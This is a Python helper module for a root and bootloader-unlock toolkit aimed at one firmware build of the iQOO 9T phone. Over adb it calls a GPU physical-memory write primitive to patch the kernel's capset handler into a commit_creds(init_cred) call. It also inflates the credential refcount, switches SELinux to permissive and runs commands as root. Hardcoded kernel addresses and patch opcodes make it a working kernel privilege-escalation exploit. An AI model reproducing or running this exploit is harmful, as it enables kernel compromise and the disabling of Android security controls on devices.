#!/usr/bin/env python3
"""
iqoo9t.py — shared helpers for the iQOO 9T (I2201 / SM8475) root + unlock tooling.

This module is intentionally dependency-free (stdlib only).  The other host
scripts import it; it can also be used interactively:

    >>> import iqoo9t as t
    >>> t.getenforce()
    'Enforcing'
    >>> t.gpu_read(t.ADDR["do_sys_capset"])
    0xd503233f

Device requirements
-------------------
* adb reachable (Developer options -> USB debugging)
* /data/local/tmp/cheese_pa, rootcmd, capset_min, devinfo_unlock installed
  (run:  python3 tools/host/rootctl.py install)
* firmware build 15.3.19.3.W30.V000L1 (the addresses below are build-specific)

The GPU primitive (cheese_pa, vendored from RamenFast/zenfone9-root, GPL-3.0)
performs exactly ONE GPU operation per process; every helper here therefore
spawns a fresh process per read/write.  A lost race faults the GPU and may
reboot the device — keep bursts short.
"""
from __future__ import annotations

import os
import re
import shutil
import subprocess
import sys
import time

# ---------------------------------------------------------------------------
# Target constants — firmware 15.3.19.3.W30.V000L1 (kernel 5.10.233-android12-9)
# ---------------------------------------------------------------------------
TOOLS_DIR = "/data/local/tmp"
DEVINFO_BLOCK = "/dev/block/by-name/devinfo"
DEVINFO_BLOCK_FALLBACK = "/dev/block/sde28"

ADDR = {
    # virtual text base: 0xffffffc008000000 ; physical base: 0xa8000000
    "do_sys_capset":     0xA8145E38,  # __do_sys_capset (kernel text)
    "init_cred":         0xAA7B0A60,  # struct cred *
    "init_cred_usage":   0xAA7B0A60,  # atomic_t usage is the first field
    "selinux_state":     0xAAA42B90,  # struct selinux_state (enforcing field)
    "init_task_cred":    0xAA79C600,
    "init_task_real_cred": 0xAA79C5F8,
}

# adrp x0, init_cred ; add x0, x0, #0xa60 ; b commit_creds
PATCH_DWORDS = [0xF0013340, 0x91298000, 0x1400FFE9]
# paciasp ; sub sp, sp, #0x80 ; str x30, [sp, #8]   (pristine entry)
ORIG_DWORDS = [0xD503233F, 0xD10203FF, 0xF800865E]

INIT_CRED_USAGE_VALUE = 0x7FFFFFFF
SELINUX_ENFORCING = 0x01010001
SELINUX_PERMISSIVE = 0x01010000

SERIAL_ENV = "IQOO_SERIAL"

_RE_READBACK = re.compile(r"value=0x([0-9a-fA-F]+)")
_RE_VERIFIED = re.compile(r"(VERIFIED|FAILED)")


class ToolError(RuntimeError):
    pass


# ---------------------------------------------------------------------------
# adb plumbing
# ---------------------------------------------------------------------------
def _adb_bin() -> str:
    return shutil.which("adb") or "adb"


def serial(explicit: str | None = None) -> str | None:
    """Resolve the device serial: explicit arg > $IQOO_SERIAL > sole adb device."""
    if explicit:
        return explicit
    env = os.environ.get(SERIAL_ENV)
    if env:
        return env
    try:
        out = subprocess.run(
            [_adb_bin(), "devices"], capture_output=True, text=True, timeout=30
        ).stdout
    except Exception:
        return None
    for line in out.splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 2 and parts[1] in ("device", "recovery"):
            return parts[0]
    return None


def adb(*args: str, timeout: int = 120, check: bool = False,
        serial_override: str | None = None) -> subprocess.CompletedProcess:
    cmd = [_adb_bin()]
    s = serial(serial_override)
    if s:
        cmd += ["-s", s]
    cmd += list(args)
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if check and r.returncode != 0:
        raise ToolError(
            f"adb {' '.join(args)} failed ({r.returncode}):\n"
            f"{r.stdout.strip()}\n{r.stderr.strip()}"
        )
    return r


def shell(command: str, timeout: int = 120, check: bool = False) -> subprocess.CompletedProcess:
    return adb("shell", command, timeout=timeout, check=check)


def push(local: str, remote: str = TOOLS_DIR, timeout: int = 300) -> None:
    adb("push", local, remote, timeout=timeout, check=True)


def pull(remote: str, local: str, timeout: int = 300) -> None:
    adb("pull", remote, local, timeout=timeout, check=True)


def wait_for_device(timeout: int = 120) -> str:
    s = serial()
    if not s:
        raise ToolError("no adb device found (enable USB debugging / accept the key)")
    deadline = time.time() + timeout
    while time.time() < deadline:
        if s in adb("devices").stdout.replace("\t", " "):
            state = adb("get-state").stdout.strip()
            if state == "device":
                return s
            if state == "recovery":
                return s
        time.sleep(2)
    raise ToolError(f"device {s} did not become ready within {timeout}s")


def getprop(name: str) -> str:
    return shell(f"getprop {name}").stdout.strip()


def getenforce() -> str:
    return shell("getenforce").stdout.strip()


# ---------------------------------------------------------------------------
# GPU physical read/write (one operation per fresh cheese_pa process)
# ---------------------------------------------------------------------------
def _binary(name: str) -> str:
    return f"{TOOLS_DIR}/{name}"


def ensure_tools(build_dir: str | None = None) -> None:
    """Push the device binaries if they are missing on the phone."""
    required = ["cheese_pa", "rootcmd", "capset_min", "devinfo_unlock"]
    missing = [n for n in required
               if shell(f"[ -x {_binary(n)} ] && echo yes").stdout.strip() != "yes"]
    if not missing:
        return
    here = os.path.dirname(os.path.abspath(__file__))
    build_dir = build_dir or os.path.normpath(os.path.join(here, "..", "out"))
    for name in missing:
        local = os.path.join(build_dir, name)
        if not os.path.isfile(local):
            raise ToolError(
                f"{name} is not on the device and {local} does not exist; "
                f"run tools/build.sh first"
            )
        push(local)
    shell(f"chmod 755 " + " ".join(_binary(n) for n in required))


def gpu_read(pa: int, tries: int = 5, timeout: int = 240) -> int | None:
    """Read one 32-bit word from kernel physical address `pa` via the GPU."""
    cmd = (
        f"CHEESE_PROBE_ONLY=1 CHEESE_NO_RETRY=1 "
        f"CHEESE_TARGET_PA=0x{pa:x} {_binary('cheese_pa')}"
    )
    for attempt in range(tries):
        r = shell(cmd, timeout=timeout)
        m = _RE_READBACK.search(r.stdout + r.stderr)
        if m:
            return int(m.group(1), 16)
        time.sleep(1.0 + attempt * 0.5)
    return None


def gpu_write(pa: int, value: int, tries: int = 6, timeout: int = 240) -> bool:
    """Write one 32-bit word to kernel physical address `pa` and verify it."""
    cmd = (
        f"CHEESE_POKE=1 CHEESE_NO_RETRY=1 "
        f"CHEESE_TARGET_PA=0x{pa:x} "
        f"CHEESE_WRITE_PA=0x{pa:x} "
        f"CHEESE_WRITE_VAL=0x{value & 0xFFFFFFFF:x} "
        f"{_binary('cheese_pa')}"
    )
    for attempt in range(tries):
        r = shell(cmd, timeout=timeout)
        out = r.stdout + r.stderr
        if "VERIFIED" in out:
            return True
        time.sleep(1.5 + attempt * 0.5)
    return False


def selftest(timeout: int = 240) -> bool:
    """Verify the perf-based physical-address leak works on this boot."""
    r = shell(f"CHEESE_SELFTEST=1 CHEESE_NO_RETRY=1 {_binary('cheese_pa')}",
              timeout=timeout)
    return "SELFTEST-PASS" in (r.stdout + r.stderr)


# ---------------------------------------------------------------------------
# Kernel patch lifecycle
# ---------------------------------------------------------------------------
def patch_state() -> str:
    v = gpu_read(ADDR["do_sys_capset"])
    if v is None:
        return "unknown (GPU op failed)"
    if v == PATCH_DWORDS[0]:
        return "armed"
    if v == ORIG_DWORDS[0]:
        return "original"
    return f"modified (0x{v:08x})"


def set_permissive(tries: int = 12) -> bool:
    for _ in range(tries):
        gpu_write(ADDR["selinux_state"], SELINUX_PERMISSIVE)
        if getenforce() == "Permissive":
            return True
        time.sleep(0.3)
    return getenforce() == "Permissive"


def set_enforcing(tries: int = 6) -> bool:
    for _ in range(tries):
        gpu_write(ADDR["selinux_state"], SELINUX_ENFORCING)
        if getenforce() == "Enforcing":
            return True
        time.sleep(0.3)
    return getenforce() == "Enforcing"


def arm(verbose: bool = True) -> None:
    """Patch __do_sys_capset, inflate init_cred.usage, go Permissive."""
    def say(msg: str) -> None:
        if verbose:
            print(msg)

    say("[*] writing __do_sys_capset tail call")
    for i, word in enumerate(PATCH_DWORDS):
        if not gpu_write(ADDR["do_sys_capset"] + 4 * i, word):
            raise ToolError(f"failed to write patch dword {i}")
        say(f"    [{i}] 0x{word:08x} -> 0x{ADDR['do_sys_capset'] + 4*i:08x}")

    say("[*] inflating init_cred.usage (prevents refcount underflow reboot)")
    if not gpu_write(ADDR["init_cred_usage"], INIT_CRED_USAGE_VALUE):
        raise ToolError("failed to write init_cred.usage")

    say("[*] setting SELinux Permissive")
    if not set_permissive():
        raise ToolError("could not make SELinux Permissive")

    state = patch_state()
    say(f"[+] patch state: {state}, getenforce={getenforce()}")


def disarm(verbose: bool = True) -> None:
    """Restore the pristine __do_sys_capset entry and re-enable SELinux."""
    def say(msg: str) -> None:
        if verbose:
            print(msg)

    say("[*] restoring __do_sys_capset")
    for i, word in enumerate(ORIG_DWORDS):
        if not gpu_write(ADDR["do_sys_capset"] + 4 * i, word):
            raise ToolError(f"failed to restore dword {i}")
    say("[*] restoring SELinux Enforcing")
    set_enforcing()


def su(command: str, shell_domain: bool = False, timeout: int = 120) -> subprocess.CompletedProcess:
    """Run `command` as uid 0 through the armed capset patch."""
    env = "ROOT_DOMAIN=u:r:shell:s0 " if shell_domain else ""
    return shell(f"{env}{_binary('rootcmd')} sh -c {shquote(command)}", timeout=timeout)


def shquote(s: str) -> str:
    return "'" + s.replace("'", "'\\''") + "'"


# ---------------------------------------------------------------------------
# Unlock verification (no root, no GPU)
# ---------------------------------------------------------------------------
def unlock_state() -> dict[str, str]:
    return {
        "flash.locked": getprop("ro.boot.flash.locked"),
        "verifiedbootstate": getprop("ro.boot.verifiedbootstate"),
        "vbmeta.device_state": getprop("ro.boot.vbmeta.device_state"),
        "veritymode": getprop("ro.boot.veritymode"),
        "secureboot_enable": getprop("ro.boot.secureboot_enable"),
    }


def is_unlocked() -> bool:
    return (
        getprop("ro.boot.flash.locked") == "0"
        and getprop("ro.boot.vbmeta.device_state") == "unlocked"
    )


if __name__ == "__main__":
    print(f"serial: {serial()}")
    for k, v in unlock_state().items():
        print(f"{k:24s} = {v}")
